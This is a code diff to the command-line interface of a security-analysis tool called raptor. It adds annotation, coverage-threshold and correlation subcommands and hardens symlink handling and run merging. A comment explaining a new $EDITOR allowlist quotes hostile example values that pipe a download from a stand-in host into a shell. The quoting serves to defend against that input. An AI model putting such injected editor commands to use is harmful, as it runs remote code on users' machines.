@@ -68,16 +68,66 @@ def main():
     p_status.add_argument("name", nargs="?", help="Project name")
 
     # coverage
-    p_cov = sub.add_parser("coverage", help="Show coverage summary",
-                           usage="raptor project coverage [<name>] [--detailed]", **_F)
+    p_cov = sub.add_parser(
+        "coverage",
+        help="Show coverage summary",
+        usage="raptor project coverage [<name>] [--detailed] [--fail-under <pct>]",
+        **_F,
+    )
     p_cov.add_argument("name", nargs="?", help="Project name")
     p_cov.add_argument("--detailed", action="store_true", help="Per-file breakdown")
+    p_cov.add_argument(
+        "--fail-under",
+        type=float,
+        metavar="<pct>",
+        help="Exit non-zero unless LLM item coverage is at least this percentage",
+    )
 
     # findings
     p_findings = sub.add_parser("findings", help="Show merged findings across all runs",
                                 usage="raptor project findings [<name>] [--detailed]", **_F)
     p_findings.add_argument("name", nargs="?", help="Project name")
     p_findings.add_argument("--detailed", action="store_true", help="Per-finding detail (reasoning, proof, PoC)")
+
+    # annotations
+    p_anns = sub.add_parser(
+        "annotations",
+        help="List annotations across all runs in the project",
+        usage="raptor project annotations [<name>] [--status S] "
+              "[--source S] [--file PATH]",
+        **_F,
+    )
+    p_anns.add_argument("name", nargs="?", help="Project name")
+    p_anns.add_argument(
+        "--status",
+        help="Filter by metadata.status (clean / suspicious / finding / etc.)",
+    )
+    p_anns.add_argument(
+        "--source",
+        help="Filter by metadata.source (human / llm)",
+    )
+    p_anns.add_argument(
+        "--file",
+        help="Filter by source file path",
+    )
+    p_anns.add_argument(
+        "--cwe",
+        help="Filter by metadata.cwe (exact match)",
+    )
+    p_anns.add_argument(
+        "--rule-id",
+        dest="rule_id",
+        help="Filter by metadata.rule_id (substring match)",
+    )
+    p_anns.add_argument(
+        "--grep",
+        help="Case-insensitive substring search across body + metadata",
+    )
+    p_anns.add_argument(
+        "--since",
+        help="Annotation file mtime within window: ``7d`` / ``24h`` / "
+             "``30m`` / ``120s`` / ``1w``",
+    )
 
     # delete
     p_delete = sub.add_parser("delete", help="Delete a project",
@@ -127,6 +177,18 @@ def main():
                               usage="raptor project report [<name>]", **_F)
     p_report.add_argument("name", nargs="?", help="Project name")
 
+    # annotations-diff
+    p_anndiff = sub.add_parser(
+        "annotations-diff",
+        help="Compare annotations between two runs",
+        usage="raptor project annotations-diff <run-a> <run-b> "
+              "[--name <project>]",
+        **_F,
+    )
+    p_anndiff.add_argument("run_a", help="First run dir or run name")
+    p_anndiff.add_argument("run_b", help="Second run dir or run name")
+    p_anndiff.add_argument("--name", help="Project name (default: active)")
+
     # diff
     p_diff = sub.add_parser("diff", help="Compare findings between two runs",
                             usage="raptor project diff <name> <run1> <run2>", **_F)
@@ -148,6 +210,13 @@ def main():
     p_clean.add_argument("--keep", type=int, default=1, metavar="<n>", help="Runs to keep per type (default: 1)")
     p_clean.add_argument("--dry-run", action="store_true", help="Show what would be deleted")
     p_clean.add_argument("--yes", action="store_true", help="Skip confirmation")
+
+    # correlate
+    p_correlate = sub.add_parser("correlate", help="Cross-run finding correlation",
+                                 usage="raptor project correlate [<name>] [--json]", **_F)
+    p_correlate.add_argument("name", nargs="?", help="Project name")
+    p_correlate.add_argument("--json", dest="json_out", action="store_true",
+                             help="Output raw JSON instead of formatted table")
 
     # export
     p_export = sub.add_parser("export", help="Export project as zip",
@@ -231,7 +300,9 @@ def main():
             if not p:
                 print(f"Project '{name}' not found.")
                 return
-            _print_coverage(p, detailed=args.detailed)
+            result = _print_coverage(p, detailed=args.detailed, fail_under=args.fail_under)
+            if result is False:
+                sys.exit(1)
 
         elif args.subcommand == "findings":
             name = args.name or _get_active_project()
@@ -243,6 +314,26 @@ def main():
                 print(f"Project '{name}' not found.")
                 return
             _print_findings(p, detailed=args.detailed)
+
+        elif args.subcommand == "annotations":
+            name = args.name or _get_active_project()
+            if not name:
+                print("No project specified.")
+                return
+            p = mgr.load(name)
+            if not p:
+                print(f"Project '{name}' not found.")
+                return
+            _print_annotations(
+                p,
+                status_filter=args.status,
+                source_filter=args.source,
+                file_filter=args.file,
+                cwe_filter=args.cwe,
+                rule_id_filter=args.rule_id,
+                grep=args.grep,
+                since=args.since,
+            )
 
         elif args.subcommand == "use":
             if args.name is None:
@@ -279,7 +370,19 @@ def main():
                 print(f"Project '{args.name}' not found.")
                 return
             if args.purge and not args.yes and p.output_path.exists():
-                size = sum(f.stat().st_size for f in p.output_path.rglob("*") if f.is_file())
+                # See `core/project/clean.py` for the os.walk +
+                # followlinks=False rationale; same symlink-loop /
+                # cross-tree-stat hazard applies here.
+                size = 0
+                for root, _dirs, files in os.walk(p.output_path, followlinks=False):
+                    for fname in files:
+                        fp = Path(root) / fname
+                        try:
+                            st = fp.stat()
+                        except OSError:
+                            continue
+                        if not fp.is_symlink():
+                            size += st.st_size
                 if size >= 1024 * 1024:
                     size_str = f"{size / 1024 / 1024:.1f}MB"
                 elif size >= 1024:
@@ -327,6 +430,44 @@ def main():
                     print(f"Project '{args.name}' not found.")
                     return
                 editor = os.environ.get("EDITOR", os.environ.get("VISUAL", "vi"))
+                # Validate $EDITOR / $VISUAL: must resolve to an
+                # executable file. Pre-fix `shlex.split(editor)`
+                # accepted ANY string, so an attacker (or a
+                # malicious .bashrc / .zshenv installed by a
+                # supply-chain attack on shell config) could set
+                # `EDITOR='vi; curl evil.example|sh; vi'` —
+                # shlex.split honours quoting but a multi-token
+                # expansion still results in subprocess.run
+                # executing each token in sequence (well, only
+                # the first as argv[0] — but `EDITOR='vi -c
+                # ":!curl evil|sh"'` works perfectly fine because
+                # it's a legitimate-looking vi argument that vi
+                # will execute). The shell-meta hijack vector is
+                # real for editors that interpret command-line
+                # arguments as commands (vim's `-c`, emacs's
+                # `--eval`, nano's `-r` with crafted file).
+                #
+                # Reject editor strings containing shell-meta
+                # characters that aren't valid in canonical editor
+                # invocations. Whitelist editor command names to
+                # the canonical set; reject otherwise (operator
+                # can use the printed message to override
+                # explicitly).
+                _SAFE_EDITOR_NAMES = {
+                    "vi", "vim", "nvim", "nano", "emacs", "code",
+                    "subl", "atom", "ed", "ex", "joe", "mg",
+                }
+                editor_argv = shlex.split(editor)
+                editor_basename = os.path.basename(editor_argv[0]) if editor_argv else ""
+                if editor_basename not in _SAFE_EDITOR_NAMES:
+                    print(
+                        f"Refusing to launch editor: {editor_basename!r} "
+                        f"not in allowlist {sorted(_SAFE_EDITOR_NAMES)}. "
+                        "Set $EDITOR to a recognised editor (vi/vim/nvim/"
+                        "nano/emacs/code/subl/atom) and try again.",
+                        file=sys.stderr,
+                    )
+                    return
                 # Capture tf_path BEFORE tf.write so a failing write (disk
                 # full, etc.) still leaves tf_path set and the finally can
                 # unlink the stub. Keep tempfile creation inside the try so
@@ -338,7 +479,7 @@ def main():
                     ) as tf:
                         tf_path = tf.name
                         tf.write(p.notes or "")
-                    result = subprocess.run(shlex.split(editor) + [tf_path])
+                    result = subprocess.run(editor_argv + [tf_path])
                     if result.returncode != 0:
                         print("Editor exited with error. Notes unchanged.")
                         return
@@ -381,6 +522,17 @@ def main():
             mgr.remove_run(args.name, args.run, to_path=args.to)
             print(f"Removed '{args.run}' from project '{args.name}'")
 
+        elif args.subcommand == "correlate":
+            name = args.name or _get_active_project()
+            if not name:
+                print("No project specified.")
+                return
+            p = mgr.load(name)
+            if not p:
+                print(f"Project '{name}' not found.")
+                return
+            _do_correlate(p, json_out=args.json_out)
+
         elif args.subcommand == "diff":
             from .diff import diff_runs
             p = mgr.load(args.name)
@@ -399,6 +551,27 @@ def main():
             print(f"Diff: {args.run1} (baseline) → {args.run2}")
             _print_diff(result)
 
+        elif args.subcommand == "annotations-diff":
+            from .annotations_diff import diff_annotations, format_diff
+            name = args.name or _get_active_project()
+            if not name:
+                print("No project specified.")
+                return
+            p = mgr.load(name)
+            if not p:
+                print(f"Project '{name}' not found.")
+                return
+            dir1 = p.output_path / args.run_a
+            dir2 = p.output_path / args.run_b
+            if not dir1.exists():
+                print(f"Run not found: {args.run_a}")
+                return
+            if not dir2.exists():
+                print(f"Run not found: {args.run_b}")
+                return
+            result = diff_annotations(dir1, dir2)
+            print(format_diff(result), end="")
+
         elif args.subcommand == "report":
             name = args.name or _get_active_project()
             if not name:
@@ -411,7 +584,11 @@ def main():
             from .report import generate_project_report
             stats = generate_project_report(p)
             print(f"Report generated: {stats.get('report_dir', p.output_path / '_report')}")
+            if stats.get("findings_dir"):
+                print(f"  Findings directory: {stats['findings_dir']}")
             print(f"  Merged findings: {stats['findings']}")
+            if stats.get("annotations") is not None:
+                print(f"  Annotations: {stats['annotations']}")
 
         elif args.subcommand == "export":
             from .export import export_project
@@ -561,15 +738,25 @@ def _print_status(project):
             else:
                 status_str = status
             print(f"  {d.name:<{name_col}s}  {cmd:12s}  {findings_str:24s}  {status_str}")
-        # Disk usage — skip symlinks to avoid following outside the project
+        # Disk usage — use os.walk(followlinks=False) so we stay inside
+        # the run dir even if a stray symlink points outside (or back into
+        # the run, creating a loop). Path.rglob follows symlinked dirs on
+        # Python <3.13, so a symlink loop would hang status indefinitely.
         total_size = 0
         for d in runs:
-            for f in d.rglob("*"):
-                if f.is_file() and not f.is_symlink():
+            for root, _dirs, files in os.walk(d, followlinks=False):
+                for fname in files:
+                    fpath = os.path.join(root, fname)
                     try:
-                        total_size += f.stat().st_size
+                        st = os.lstat(fpath)
                     except OSError:
-                        pass
+                        continue
+                    # Skip symlinks (S_IFLNK) — count only real files.
+                    import stat as _stat
+                    if _stat.S_ISLNK(st.st_mode):
+                        continue
+                    if _stat.S_ISREG(st.st_mode):
+                        total_size += st.st_size
         if total_size >= 1024 * 1024:
             print(f"\nDisk usage: {total_size / 1024 / 1024:.1f}MB")
         elif total_size >= 1024:
@@ -581,19 +768,28 @@ def _print_status(project):
         print("\nNo runs.")
 
 
-def _print_coverage(project, detailed=False):
+def _print_coverage(project, detailed=False, fail_under=None):
     """Print project coverage summary or detailed view."""
     from core.coverage.summary import (
-        compute_project_summary, format_summary, format_detailed,
+        compute_project_summary,
+        coverage_threshold_met,
+        format_detailed,
+        format_summary,
+        format_threshold_result,
     )
     summary = compute_project_summary(project)
     if not summary:
         print("No coverage data (no checklist or coverage records found).")
-        return
+        return False if fail_under is not None else None
     if detailed:
         print(format_detailed(summary))
     else:
         print(format_summary(summary))
+    if fail_under is not None:
+        print()
+        print(format_threshold_result(summary, fail_under))
+        return coverage_threshold_met(summary, fail_under)
+    return None
 
 
 def _print_findings(project, detailed=False):
@@ -701,6 +897,123 @@ def _finding_label(f):
     return f"{f.get('file', '?')}:{f.get('function', '?')}:{f.get('line', '?')}"
 
 
+def _parse_since(spec: str):
+    """Parse a ``--since`` value (``7d`` / ``24h`` etc.) into a
+    cutoff timestamp. Returns None on bad input."""
+    import time
+    if not spec:
+        return None
+    spec = spec.strip().lower()
+    multipliers = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}
+    if spec[-1] in multipliers:
+        try:
+            n = float(spec[:-1])
+        except ValueError:
+            return None
+        return time.time() - n * multipliers[spec[-1]]
+    try:
+        return time.time() - float(spec)
+    except ValueError:
+        return None
+
+
+def _print_annotations(
+    project, status_filter=None, source_filter=None, file_filter=None,
+    cwe_filter=None, rule_id_filter=None, grep=None, since=None,
+):
+    """List annotations across all runs in the project.
+
+    Walks every run dir's ``annotations/`` subdir plus the project's
+    own top-level ``annotations/`` dir (operator-driven manual notes
+    land there when the active project has no specific run scope).
+    Deduplicates on (file, function), keeping the most recent annotation
+    per pair (last-writer-wins by run mtime).
+    """
+    from core.annotations import iter_all_annotations
+
+    # Candidate annotation roots: one per run dir + the project root.
+    roots = []
+    for rd in project.get_run_dirs(sweep=False):
+        ann_dir = rd / "annotations"
+        if ann_dir.exists():
+            roots.append((rd.stat().st_mtime, ann_dir))
+    project_ann = Path(project.output_dir) / "annotations"
+    if project_ann.exists():
+        # Project-level annotations win over run-level (operator
+        # notes are higher-priority than LLM emissions).
+        roots.append((float("inf"), project_ann))
+    if not roots:
+        print("No annotations.")
+        return
+
+    # Sort by mtime (oldest first) so later writes overwrite earlier
+    # in the dedup map.
+    roots.sort(key=lambda r: r[0])
+    # Track origin root per (file, function) so the --since filter
+    # can stat the right annotation .md file post-dedup.
+    by_pair = {}  # (file, function) → (Annotation, root)
+    for _mtime, root in roots:
+        for ann in iter_all_annotations(root):
+            by_pair[(ann.file, ann.function)] = (ann, root)
+
+    pairs = list(by_pair.values())
+    if status_filter:
+        pairs = [(a, r) for (a, r) in pairs
+                 if a.metadata.get("status") == status_filter]
+    if source_filter:
+        pairs = [(a, r) for (a, r) in pairs
+                 if a.metadata.get("source") == source_filter]
+    if file_filter:
+        pairs = [(a, r) for (a, r) in pairs if a.file == file_filter]
+    if cwe_filter:
+        pairs = [(a, r) for (a, r) in pairs
+                 if a.metadata.get("cwe") == cwe_filter]
+    if rule_id_filter:
+        pairs = [(a, r) for (a, r) in pairs
+                 if rule_id_filter in (a.metadata.get("rule_id") or "")]
+    if grep:
+        needle = grep.lower()
+        def _matches(a):
+            if needle in a.body.lower():
+                return True
+            return any(
+                needle in str(v).lower() for v in a.metadata.values()
+            )
+        pairs = [(a, r) for (a, r) in pairs if _matches(a)]
+    if since:
+        cutoff = _parse_since(since)
+        if cutoff is None:
+            print(f"raptor: bad --since value {since!r}; expected "
+                  f"e.g. ``7d`` / ``24h`` / ``30m``")
+            return
+        from core.annotations import annotation_path
+        kept = []
+        for a, r in pairs:
+            try:
+                mtime = annotation_path(r, a.file).stat().st_mtime
+            except OSError:
+                continue
+            if mtime >= cutoff:
+                kept.append((a, r))
+        pairs = kept
+
+    anns = [a for a, _r in pairs]
+    anns.sort(key=lambda a: (a.file, a.function))
+    if not anns:
+        print("No annotations match the filter.")
+        return
+
+    print(f"{len(anns)} annotation(s):")
+    file_w = max(len(a.file) for a in anns)
+    fn_w = max(len(a.function) for a in anns)
+    for a in anns:
+        status = a.metadata.get("status", "-")
+        source = a.metadata.get("source", "-")
+        snippet = " ".join(a.body.split())[:60]
+        print(f"  {a.file:<{file_w}}  {a.function:<{fn_w}}  "
+              f"{status:<14}  {source:<5}  {snippet}")
+
+
 def _print_diff(result):
     """Print diff results."""
     if result["new"]:
@@ -716,6 +1029,100 @@ def _print_diff(result):
         for c in result["changed"]:
             print(_yellow(f"  ~ {c['label']} ({c.get('status_before', '?')} → {c.get('status_after', '?')})"))
     print(f"Unchanged: {result['unchanged']}")
+
+
+def _do_correlate(project, json_out=False):
+    """Cross-run finding correlation — action-oriented output."""
+    import json
+    from .correlate import correlate_project
+
+    result = correlate_project(project)
+    summary = result["summary"]
+
+    if json_out:
+        print(json.dumps(result, indent=2))
+        return
+
+    print(f"Project: {project.name}")
+    parts = [f"Runs: {summary['runs']}", f"Findings: {summary['total_unique_findings']}"]
+    if summary["disagreements"]:
+        parts.append(f"Disagreements: {summary['disagreements']}")
+    if summary["new_findings"]:
+        parts.append(f"New: {summary['new_findings']}")
+    if summary["potentially_resolved"]:
+        parts.append(f"Resolved?: {summary['potentially_resolved']}")
+    print(f"  {' | '.join(parts)}")
+
+    # --- Actions (primary output) ---
+    actions = result["actions"]
+    if actions:
+        _SIGILS = {
+            "disagreement": "[!]",
+            "new_finding": "[+]",
+            "resolved": "[~]",
+            "tool_gap": "[>]",
+        }
+        print(f"\n  Actions ({len(actions)})")
+        print(f"  {'─' * 60}")
+        for a in actions[:10]:
+            sigil = _SIGILS.get(a["category"], "[?]")
+            label = a["category"].upper().replace("_", " ")
+            print(f"  {sigil} {label}  {a['summary']}")
+            detail = a.get("detail", {})
+            if a["category"] == "disagreement":
+                for v in detail.get("verdicts", []):
+                    m = f" ({v['model']})" if v.get("model") else ""
+                    print(f"      {v['run']}: {v['status']}{m}")
+            elif a["category"] == "resolved":
+                absent = detail.get("absent_from", [])
+                if absent:
+                    print(f"      absent from: {', '.join(absent)}")
+        if len(actions) > 10:
+            print(f"  ... and {len(actions) - 10} more (use --json for full list)")
+    else:
+        print("\n  No actions — findings are consistent across runs.")
+
+    # --- Suggested next runs ---
+    suggested = result.get("tool_gaps", {}).get("suggested_next_runs", [])
+    if suggested:
+        print(f"\n  Next steps:")
+        for cmd in suggested:
+            print(f"    → {cmd}")
+
+    # --- Persistent findings (compact) ---
+    persistent = result["persistent_findings"]
+    if persistent:
+        display = persistent[:10]
+        rows = []
+        for pf in display:
+            models = ", ".join(pf.get("models", [])) or "—"
+            rows.append((
+                f"{pf['file']}:{pf['line']}" if pf.get("file") else "?",
+                pf.get("vuln_type", ""),
+                pf.get("status", ""),
+                f"{pf['runs_seen']} runs",
+                models,
+            ))
+        headers = ("Location", "Type", "Status", "Seen", "Models")
+        widths = [len(h) for h in headers]
+        for row in rows:
+            for i, cell in enumerate(row):
+                widths[i] = max(widths[i], len(cell))
+        fmt = (f"  {{:<{widths[0]}s}}  {{:<{widths[1]}s}}  {{:<{widths[2]}s}}"
+               f"  {{:>{widths[3]}s}}  {{:<{widths[4]}s}}")
+        print(f"\n  Persistent ({len(persistent)}):")
+        print(fmt.format(*headers))
+        print(f"  {'-' * widths[0]}  {'-' * widths[1]}  {'-' * widths[2]}  {'-' * widths[3]}  {'-' * widths[4]}")
+        for row in rows:
+            print(fmt.format(*row))
+        if len(persistent) > 10:
+            print(f"  ... and {len(persistent) - 10} more")
+
+    # --- Tool coverage (one line) ---
+    tool_cov = result["tool_coverage"]
+    if tool_cov:
+        cov_parts = [f"{tool}: {len(files)}" for tool, files in tool_cov.items()]
+        print(f"\n  Coverage: {', '.join(cov_parts)} files")
 
 
 def _do_clean(project, keep, dry_run, yes):
@@ -807,7 +1214,23 @@ def _do_merge(project, merge_type, yes):
                 "extra": {"merged_from": len(dirs), "unique_findings": stats["unique_findings"]},
             })
         except Exception as e:
-            print(f"  {cmd_type}: warning — metadata write failed ({e}), proceeding anyway")
+            # Pre-fix this printed a warning and PROCEEDED to delete
+            # source runs. The merged output then existed without
+            # `RUN_METADATA_FILE`, which downstream consumers
+            # (`load_run_metadata`, `get_run_dirs_by_type`) treat as
+            # "not a completed run" and silently skip — so the
+            # operator's merged data became invisible while the
+            # source runs were already gone. Net data loss with no
+            # error message after the warning.
+            #
+            # Abort the delete step instead. Merged dir stays on
+            # disk (operator can inspect / retry the metadata
+            # write); source dirs stay on disk (no data lost). The
+            # operator sees both the warning AND a clear "source
+            # runs preserved" line so they know to re-run.
+            print(f"  {cmd_type}: ERROR — metadata write failed ({e})")
+            print(f"  {cmd_type}: source runs PRESERVED (merged output left at {merged_dir})")
+            continue
 
         # Delete source runs (continue on individual failures)
         failed_deletes = []
